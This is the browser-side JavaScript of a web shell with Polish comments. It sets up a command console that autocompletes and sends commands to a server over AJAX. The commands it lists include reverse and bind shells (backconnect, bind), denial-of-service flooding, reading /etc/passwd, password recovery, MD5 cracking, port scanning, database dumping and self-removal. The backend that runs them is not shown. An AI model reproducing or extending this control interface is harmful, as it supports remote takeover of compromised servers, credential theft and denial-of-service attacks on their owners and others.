<script type="text/javascript">

/**
 * Automatyczne dopasowanie wielkosci pola konsoli
 */
window.onload = function()
{
	var oConsole = document.getElementById( 'console' );

	var iHeight = innerHeight - 320;

	var sHeight = ( ( iHeight < 100 ) ? 100 : iHeight ) + 'px';

	/**
	 * Zmiana wymiarow
	 */
	oConsole.style.minHeight = sHeight;
	oConsole.style.height = sHeight;
}

/**
 * Lista polecen, ktorych nie nalezy uzywac z AJAX
 */
var aExclude = new Array
(
	'edit',
	'upload',
	'down',
	'download',
	'get',
	'logout',
	'bind',
	'mysqldump',
	'mysqldumper',
	'mysqlbackup',
	'passwordrecovery',
	'pr',
	'dos',
	'flood',
	'backconnect',
	'bc',
	'irc',
	'proxy',
	'emailvalidator'
);

/**
 * Podpowiedi - lista wszystkich dostepnych polecen
 */
var aCommands = new Array
(
	'help',
	'modules',
	'edit',
	'upload',
	'system',
	'exec',
	'info',
	'mysql',
	'cd',
	'bind',
	'pwd',
	'remove',
	'rm',
	'delete',
	'del',
	'pack',
	'unpack',
	'exit',
	'mysqldump',
	'mysqldumper',
	'mysqlbackup',
	'ftpdownload',
	'ftpdown',
	'ftpget',
	'mv',
	'move',
	'passwordrecovery',
	'pr',
	'logout',
	'ftpupload',
	'ftpup',
	'ftpput',
	'eval',
	'php',
	'dos',
	'flood',
	'g4m3',
	'hexdump',
	'hd',
	'cat',
	'backconnect',
	'bc',
	'socketupload',
	'socketup',
	'socketput',
	'cp',
	'copy',
	'echo',
	'chmod',
	'mail',
	'email',
	'sendmail',
	'mkdir',
	'download',
	'down',
	'get',
	'bcat',
	'b64',
	'etcpasswd',
	'revip',
	'socketdownload',
	'socketdown',
	'socketget',
	'md5crack',
	'irc',
	'ping',
	'ls',
	'proxy',
	'phpinfo',
	'destroy',
	'removeshell',
	'emailvalidator',
	'portscan',
	'portscanner',
	'id',
	'whoami',
	'speedtest'
);

/**
 * body
 */
var oBody = document.getElementsByTagName( 'body' )[0];

/**
 * Not for pussies
 * a po drugie to nie chce mi sie specjalnie robic wsparcia dla IE
 * Opera, Chrome, Firefox wystarczy
 */
if( navigator.appName == 'Microsoft Internet Explorer' )
{
	oBody.innerHTML = '<h1 style="text-align: center; margin-top: 60px">Twoja przeglądarka jest do dupy, wymień ją na coś lepszego: Opera, Chrome, Firefox</h1>';
}

/**
 * Okno ze statusem
 */
var oStatus = document.createElement( 'div' );

oStatus.setAttribute( 'id', 'status' );
oStatus.innerHTML = '&nbsp;';
oStatus.style.display = 'none';

oBody.appendChild( oStatus );

/**
 * Formularz
 */
var oForm = document.getElementsByTagName( 'form' )[0];

oForm.setAttribute( 'onsubmit', 'return submitForm();' );

/**
 * input - polecenie
 */
var oCmd = document.getElementById( 'cmd' );

/**
 * Podpowiedzi
 */
var oPrompt = document.createElement( 'div' );

oPrompt.setAttribute( 'id', 'prompt' );
oPrompt.setAttribute( 'style', 'text-align: left; padding-left: 25px' );
oPrompt.innerHTML = '<strong>Dostępne polecenia:</strong> <em>Brak</em>';

oForm.appendChild( document.createElement( 'br' ) );
oForm.appendChild( document.createElement( 'br' ) );
oForm.appendChild( oPrompt );

autoPrompt( oCmd.value.substring( 1 ) );

/**
 * Automatyczne podpowiedzi
 */
event( oCmd, 'keyup', function()
	{
		if( ( oCmd.value.length > 1 ) && ( oCmd.value.substring( 0, 1 ) == ':' ) )
		{
			autoPrompt( oCmd.value.substring( 1 ) );
		}
		else
		{
			oPrompt.innerHTML = '<strong>Dostępne polecenia:</strong> <em>Brak</em>';
		}
	}
);

/**
 * Sprawdzanie czy polecenie nie moze zostac uzyte z AJAX
 */
function isExclude( sCmd )
{
	for( i = 0; i < aExclude.length; ++i )
	{
		if( sCmd.substring( 1, aExclude[ i ].length + 1 ) == aExclude[ i ] )
		{
			return true;
		}
	}

	return false;
}

function submitForm()
{
	var oCmd = document.getElementById( 'cmd' );

	if(  ( document.getElementById( 'cmd-send' ).getAttribute( 'value' ) == 'Execute' )
	    && ! isExclude( oCmd.value )
	)
	{
		oStatus.style.display = 'block';

		var oAjax = new XMLHttpRequest();

		oAjax.open( 'POST', '', true );
		oAjax.setRequestHeader( 'X-Requested-With', 'XMLHttpRequest' );
		oAjax.setRequestHeader( 'Content-Type', 'application/x-www-form-urlencoded' );
		oAjax.onreadystatechange = function()
		{
			/**
			 * Konsola
			 */
			if( oAjax.readyState == 4 )
			{
				document.getElementById( 'console').innerHTML = oAjax.responseText;
				oStatus.style.display = 'none';
			}
		}

		var sCmd = escape( oCmd.value );

		oAjax.send( 'cmd=' + sCmd.replace( new RegExp( '\\+', 'g' ), '%2B' ) );
		return false;
	}

	return true;
}

/**
 * Zdarzenia
 */
function event( oElement, sAction, fFunction )
{
	if( oElement.attachEvent )
	{
		oElement.attachEvent( sAction, fFunction );
	}
	else if( oElement.addEventListener )
	{
		oElement.addEventListener( sAction, fFunction );
	}
}

/**
 * Zmiana polecenia
 */
function changeCommand( sCmd )
{
	oCmd.value = ':' + sCmd + ' ';
	autoPrompt( sCmd );
}

/**
 * Podpowiedzi
 */
function autoPrompt( sCommand )
{
	var sOutput = '';

	aParametrs = sCommand.split( ' ' );
	sCommand = aParametrs[0].trim();

	if( sCommand != '' )
	{
		for( i in aCommands )
		{
			if( aCommands[ i ].substring( 0, sCommand.length ) == sCommand )
			{
				sOutput += '<span onclick="changeCommand(\'' + aCommands[ i ] + '\');">';

				/**
				 * Wyroznienie szukanej frazy kolorem czerwonym
				 */
				sOutput += '<span class="red">';
				sOutput += aCommands[ i ].substring( 0, sCommand.length );
				sOutput += '</span>';

				sOutput += aCommands[ i ].substring( sCommand.length );
				sOutput += '</span>,&nbsp;';
			}
		}
	}

	if( sOutput == '' )
	{
		sOutput = '<em>Brak</em>';
	}

	oPrompt.innerHTML = '<strong>Dostępne polecenia:</strong> ' + sOutput;

	/**
	 * Po kliknieciu na polecenie
	 */
	var oSpan = oPrompt.getElementsByTagName( 'span' );

	for( i = 0; i < oSpan.length; ++i )
	{
		sName = oSpan[ i ].getAttribute( 'onclick' );

		if( sName != null )
		{
			oSpan[ i ].style.cursor = 'pointer';
		}
	}
}
</script>